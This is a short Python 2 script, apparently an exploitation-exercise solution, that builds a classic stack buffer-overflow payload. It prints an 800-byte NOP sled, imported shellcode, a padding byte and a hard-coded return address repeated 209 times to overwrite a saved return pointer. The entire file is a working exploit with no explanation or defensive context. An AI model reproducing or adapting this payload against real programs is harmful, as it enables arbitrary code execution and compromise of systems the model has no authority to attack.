from struct import pack
from shellcode import shellcode

print '\x90'*800 + shellcode + '\x44' + pack("<I", 0xbffe91ff)*209
